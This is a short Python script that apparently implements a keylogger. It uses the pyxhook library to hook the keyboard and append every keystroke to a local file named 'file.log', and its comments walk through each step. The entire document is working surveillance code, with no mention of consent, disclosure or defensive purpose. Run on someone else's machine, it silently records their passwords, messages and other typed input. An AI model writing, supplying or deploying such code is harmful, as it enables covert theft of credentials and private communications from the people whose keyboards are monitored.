import pyxhook
log_file='file.log'

def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
